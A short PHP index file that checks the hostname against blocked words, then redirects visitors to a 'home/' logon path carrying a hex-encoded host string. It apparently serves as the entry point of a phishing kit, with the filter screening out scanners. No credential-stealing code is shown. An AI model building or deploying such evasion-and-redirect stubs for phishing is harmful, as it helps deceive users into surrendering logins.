<?php
/*
* index.php
*/
require_once 'home/hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="home/?$host-$host-$host-$host";

header("location: $Logon");


?>
